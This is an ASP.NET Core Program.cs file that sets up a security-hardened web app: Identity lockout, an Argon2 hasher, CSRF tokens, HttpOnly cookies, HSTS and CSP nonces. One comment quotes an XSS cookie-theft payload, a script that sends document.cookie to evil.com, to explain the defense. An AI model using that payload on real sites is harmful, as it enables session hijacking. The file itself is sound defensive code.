using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;
using SecureWebApp.Data;
using SecureWebApp.Middleware;
using SecureWebApp.Models;
using SecureWebApp.Services;
using System;
using System.Security.Authentication;

var builder = WebApplication.CreateBuilder(args);

// ============================================================
// DATABASE CONFIGURATION - SQLite
// ============================================================
builder.Services.AddDbContext<ApplicationDbContext>(options =>
    options.UseSqlite(builder.Configuration.GetConnectionString("DefaultConnection")));

// ============================================================
// IDENTITY CONFIGURATION WITH LOCKOUT SETTINGS (Section 1.1)
// ============================================================
builder.Services.AddIdentity<ApplicationUser, IdentityRole>(options =>
{
    // Lockout settings - Protection against brute force attacks
    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);
    options.Lockout.MaxFailedAccessAttempts = 5;
    options.Lockout.AllowedForNewUsers = true;

    // Password settings for additional security
    options.Password.RequireDigit = true;
    options.Password.RequireLowercase = true;
    options.Password.RequireUppercase = true;
    options.Password.RequireNonAlphanumeric = true;
    options.Password.RequiredLength = 12;

    // User settings
    options.User.RequireUniqueEmail = true;
    options.SignIn.RequireConfirmedAccount = false;
})
.AddEntityFrameworkStores<ApplicationDbContext>()
.AddDefaultTokenProviders();

// ============================================================
// CUSTOM ARGON2 PASSWORD HASHER (Section 1.2)
// ============================================================
builder.Services.AddScoped<IPasswordHasher<ApplicationUser>, Argon2PasswordHasher<ApplicationUser>>();

// ============================================================
// ANTI-FORGERY / CSRF PROTECTION (Section 1.3)
// XSS PROTECTION: HttpOnly cookies prevent JavaScript access to tokens
// ============================================================
builder.Services.AddAntiforgery(options =>
{
    options.FormFieldName = "__RequestVerificationToken";
    options.HeaderName = "X-CSRF-TOKEN";
    options.Cookie.Name = "CSRF-TOKEN";
    // XSS PROTECTION LAYER 4: HttpOnly prevents JavaScript from reading this cookie
    // Even if XSS attack succeeds, attacker cannot steal CSRF token via document.cookie
    options.Cookie.HttpOnly = true;
    // Use .Always in production to require HTTPS, .SameAsRequest for development
    options.Cookie.SecurePolicy = builder.Environment.IsDevelopment()
        ? CookieSecurePolicy.SameAsRequest
        : CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Strict;
});

// ============================================================
// DATA PROTECTION FOR ENCRYPTION (Section 2.1)
// ============================================================
builder.Services.AddDataProtection();

// ============================================================
// XSS PROTECTION: CSP NONCE SERVICE (Defense Layer 2)
// ============================================================
// Generates per-request nonces for Content Security Policy
// This allows inline scripts/styles only when they have the correct nonce
builder.Services.AddScoped<ICspNonceService, CspNonceService>();

// ============================================================
// XSS PROTECTION: HTML SANITIZER SERVICE (Defense Layer 5)
// ============================================================
// Use this ONLY when you must allow some HTML from users.
// NEVER use Html.Raw() with unsanitized user data!
// Always prefer Razor's automatic encoding (@Model.Property)
builder.Services.AddScoped<IHtmlSanitizerService, HtmlSanitizerService>();

// ============================================================
// CREDIT CARD ENCRYPTION SERVICE (Section 2.1)
// ============================================================
builder.Services.AddScoped<ICreditCardEncryptionService, CreditCardEncryptionService>();

// ============================================================
// SECURE COOKIE CONFIGURATION (Section 2.3)
// XSS PROTECTION LAYER 4: HttpOnly cookies for session tokens
// ============================================================
builder.Services.ConfigureApplicationCookie(options =>
{
    options.Cookie.Name = "SecureWebApp.Auth";
    // XSS PROTECTION: HttpOnly = true prevents JavaScript access to auth cookie
    // Attackers cannot steal session tokens via XSS attacks like:
    // <script>fetch('evil.com?cookie='+document.cookie)</script>
    options.Cookie.HttpOnly = true;
    // Secure = Always ensures cookie only sent over HTTPS (production)
    options.Cookie.SecurePolicy = builder.Environment.IsDevelopment()
        ? CookieSecurePolicy.SameAsRequest
        : CookieSecurePolicy.Always;
    // SameSite = Strict prevents cookie from being sent in cross-site requests
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.ExpireTimeSpan = TimeSpan.FromMinutes(30);
    options.SlidingExpiration = true;
    options.LoginPath = "/Account/Login";
    options.LogoutPath = "/Account/Logout";
    options.AccessDeniedPath = "/Account/AccessDenied";
});

// ============================================================
// SESSION CONFIGURATION
// XSS PROTECTION LAYER 4: HttpOnly session cookies
// ============================================================
builder.Services.AddSession(options =>
{
    options.Cookie.Name = "SecureWebApp.Session";
    // XSS PROTECTION: HttpOnly prevents session hijacking via JavaScript
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = builder.Environment.IsDevelopment()
        ? CookieSecurePolicy.SameAsRequest
        : CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.IdleTimeout = TimeSpan.FromMinutes(20);
});

// ============================================================
// HSTS CONFIGURATION (Section 2.3)
// ============================================================
builder.Services.AddHsts(options =>
{
    options.Preload = true;
    options.IncludeSubDomains = true;
    options.MaxAge = TimeSpan.FromDays(365);
});

// ============================================================
// MVC WITH AUTO ANTI-FORGERY VALIDATION
// ============================================================
builder.Services.AddControllersWithViews(options =>
{
    options.Filters.Add(new Microsoft.AspNetCore.Mvc.AutoValidateAntiforgeryTokenAttribute());
});

// ============================================================
// LOGGING
// ============================================================
builder.Services.AddLogging(logging =>
{
    logging.AddConsole();
    logging.AddDebug();
});

var app = builder.Build();

// ============================================================
// MIDDLEWARE PIPELINE
// ============================================================

if (!app.Environment.IsDevelopment())
{
    app.UseExceptionHandler("/Home/Error");
    app.UseHsts();
}

// Security Headers Middleware (Section 2.3)
app.UseMiddleware<SecurityHeadersMiddleware>();

app.UseStaticFiles();

app.UseRouting();

app.UseSession();

app.UseAuthentication();
app.UseAuthorization();

app.MapControllerRoute(
    name: "default",
    pattern: "{controller=Home}/{action=Index}/{id?}");

// ============================================================
// DATABASE INITIALIZATION
// ============================================================
using (var scope = app.Services.CreateScope())
{
    var services = scope.ServiceProvider;
    try
    {
        var context = services.GetRequiredService<ApplicationDbContext>();
        context.Database.EnsureCreated();

        // Seed roles if needed
        var roleManager = services.GetRequiredService<RoleManager<IdentityRole>>();
        if (!await roleManager.RoleExistsAsync("User"))
        {
            await roleManager.CreateAsync(new IdentityRole("User"));
        }
        if (!await roleManager.RoleExistsAsync("Admin"))
        {
            await roleManager.CreateAsync(new IdentityRole("Admin"));
        }
    }
    catch (Exception ex)
    {
        var logger = services.GetRequiredService<ILogger<Program>>();
        logger.LogError(ex, "An error occurred while creating the database.");
    }
}

app.Run();